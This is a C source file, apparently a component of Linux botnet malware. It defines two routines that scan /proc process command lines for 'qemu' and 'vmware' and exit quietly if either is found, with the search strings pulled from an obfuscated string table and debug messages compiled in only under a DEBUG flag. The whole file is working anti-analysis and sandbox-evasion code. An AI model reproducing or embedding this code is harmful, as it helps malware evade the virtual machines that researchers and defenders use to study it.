#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <ctype.h>

#include "includes.h"
#include "table.h"

void check_environment()
{
    struct dirent *entry;
    DIR *dir = opendir(enc[PROC_DIR_2].string);
    if (!dir)
    {
#ifdef DEBUG
        printf("[environment] couldn't access '/proc' exiting...\n");
#endif
        exit(0);
    }

    while ((entry = readdir(dir)) != NULL)
    {
        if (isdigit(entry->d_name[0]))
        {
            char cmdline_path[256];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
            
            FILE *cmdline_file = fopen(cmdline_path, "r");
            if (cmdline_file)
            {
                char cmdline[256];
                if (fgets(cmdline, sizeof(cmdline), cmdline_file))
                {
                    if (strstr(cmdline, enc[CHECK_QEMU].string))
                    {
#ifdef DEBUG
                        printf("[environment] Detected 'qemu' in process %s, exiting...\n", entry->d_name);
#endif
                        fclose(cmdline_file);
                        closedir(dir);
                        exit(0);
                    }
                }
                fclose(cmdline_file);
            }
        }
    }
    closedir(dir);

#ifdef DEBUG
    printf("[environment] No 'qemu' process found! Proceeding...\n");
#endif
}

void check_environment_vmware()
{
    struct dirent *entry;
    DIR *dir = opendir(enc[PROC_DIR_2].string);
    if (!dir)
    {
#ifdef DEBUG
        printf("[environment] couldn't access '/proc' exiting...\n");
#endif
        exit(0);
    }

    while ((entry = readdir(dir)) != NULL)
    {
        if (isdigit(entry->d_name[0]))
        {
            char cmdline_path[256];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
            
            FILE *cmdline_file = fopen(cmdline_path, "r");
            if (cmdline_file)
            {
                char cmdline[256];
                if (fgets(cmdline, sizeof(cmdline), cmdline_file))
                {
                    if (strstr(cmdline, enc[CHECK_VMWR].string))
                    {
#ifdef DEBUG
                        printf("[environment] Detected 'vmware' in process %s, exiting...\n", entry->d_name);
#endif
                        fclose(cmdline_file);
                        closedir(dir);
                        exit(0);
                    }
                }
                fclose(cmdline_file);
            }
        }
    }
    closedir(dir);

#ifdef DEBUG
    printf("[environment] No 'vmware' process found! Proceeding...\n");
#endif
}
